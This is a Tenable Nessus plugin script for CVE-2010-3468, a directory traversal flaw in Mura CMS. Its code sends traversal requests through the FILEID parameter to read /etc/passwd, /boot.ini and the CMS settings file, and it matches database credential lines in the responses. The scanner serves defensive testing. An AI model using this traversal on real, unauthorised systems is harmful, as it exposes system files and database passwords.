#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(49700);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2015/09/24 21:17:12 $");

  script_cve_id("CVE-2010-3468");
  script_bugtraq_id(43499);
  script_osvdb_id(68243);
  script_xref(name:"EDB-ID", value:"15120");

  script_name(english:"Mura CMS FILEID Parameter Directory Traversal");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server includes a ColdFusion script that is affected
by a directory traversal vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of Mura CMS installed on the remote host fails to
sanitize user-supplied input to the 'FILEID' parameter of the
'tasks/render/file' script of directory traversal sequences before
using it to return the contents of a file.

An unauthenticated, remote attacker can exploit this issue to disclose
the contents of sensitive files on the affected system subject to the
privileges under which the web server operates."
  );
  script_set_attribute(attribute:"see_also", value:"http://www.getmura.com/index.cfm/blog/critical-security-patch/");
  script_set_attribute(attribute:"solution", value:"Apply the security patch referenced in the vendor's advisory.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/09/26");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/09/11");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/09/30");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:blueriver:mura_cms");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("mura_cms_detect.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/mura_cms");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, embedded:FALSE);


# Test an install.
install = get_install_from_kb(appname:'mura_cms', port:port, exit_on_fail:TRUE);
dir = install['dir'];


os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');
files = make_list('config/settings.ini.cfm', files);

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";
file_pats['config/settings.ini.cfm'] = '^db(usernam|password)[ \t]*=[ \t]*[^ \t]';


# Loop through files to look for.
foreach file (files)
{
  # Try to exploit the issue.
  if (file[0] == '/')
  {
    if ("boot.ini" >< file) traversal = crap(data:"..\", length:3*9) + '..';
    else                    traversal = crap(data:"../", length:3*9) + '..';
  }
  else traversal = '../../';

  url = dir + '/tasks/render/file/?' +
    'FILEID=' + traversal + file;

  res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

  # There's a problem if we see the expected contents.
  body = res[2];
  file_pat = file_pats[file];

  if (
    'Content-Disposition: inline;filename=""' >< res[1] &&
    egrep(pattern:file_pat, string:body)
  )
  {
    if (report_verbosity > 0)
    {
      if (os && "Windows" >< os) file = str_replace(find:'/', replace:'\\', string:file);

      header =
        'Nessus was able to exploit the issue to retrieve the contents of\n' +
        "'" + file + "' on the remote host using the following URL";
      trailer = '';

      if (report_verbosity > 1)
      {
        trailer =
          'Here are its contents :\n' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          body +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
      }
      report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
exit(0, "The Mura CMS install at "+build_url(port:port, qs:dir+'/')+" is not affected.");
